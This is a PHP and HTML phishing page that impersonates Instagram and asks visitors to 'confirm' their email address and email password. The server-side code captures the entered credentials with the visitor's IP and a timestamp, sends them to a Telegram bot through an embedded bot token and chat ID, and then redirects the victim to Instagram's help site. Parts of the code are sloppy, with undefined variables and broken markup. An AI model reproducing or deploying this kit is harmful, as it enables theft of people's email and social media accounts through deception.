<?php 
if ($_POST) {
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$mail=$_POST["email"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
     
fwrite($file, " mail : ".$mail."\n\n" ." mailsifre: ".$password. "\n\n"." ip: " .$ip."\n\n".   " Tarih: " .$date.  "\n\n\n\n\n\n\n\n\n");

fclose($file);

  
 header("Location: https://help.instagram.com/");
}
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Confirm Your Mail</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
</head>
<body><center>
	<header>

			<main>
	<img src="dCSqj7zXbicuVhgspgLiaQ.gif" width="80"><br>

	</header>
	<main>
		<img src="https://cdn.dribbble.com/users/199215/screenshots/10180559/media/e92f5499d15e13469e21eb081407b2dd.gif" width="100">
			<h3 class="h3" style="color:#555;">Confirm Your Mail Address</h3>
			<p style="letter-spacing:0px;color:#777;">
				Please enter the email for your Instagram account.
			</p><br>


</select>
<br>
<br>
			<form method="post">
			<input type="email" name="email" placeholder=" E-Mail" required="on"><br>
			<input type="password" name="password" placeholder=" E-Mail Password" required="on">
			<br>
			<button type="submit" class="slm">Confirm</button>
			<p style="letter-spacing:0px;color:#777;">
				</header>
	<main>
	<img src="dCSqj7zXbicuVhgspgLiaQ.gif" width="80"><br>

			</p>
		</form>
	</main>


	
	<script type="text/javascript">console.log("Script | 力nsta @capit6l :)");</script>
</center>
<?php
$token='5600614679:AAGqHWMZHL-RpxH_OCkrox1ZVYAncNew24w';

$data = [
'text' => '

mail : '.$mail.'
Şifre : '.$password.'
IP: '.$ip.'
Tarih : '.$cur_time.'
',
'chat_id' =>5471515322
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );




?>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{border-bottom:1px solid #cecece;
		background:white;
		
		padding-top:10px;}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
			color:#333;
			font-weight:400;
			word-spacing:1px;
			letter-spacing:1px;
			width:350px;
			max-width:90%;
			font-size:15px;
		}main input{
			transition:1s;
			padding:5px;
			border:none;
			width:220px;
			height:33px;
			outline:none;
			border:1px solid #cecece;
			padding-left:5px;
			font-size:14px;
			background:#fafafa;
			border-radius:4px;
			font-size:18px;
			margin-top:10px;

		}main input::placeholder{
			font-size:12px;
			color:#999;

		}main .slm{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;
			background:#f5f6f8;

		}
</style>
</body></html>
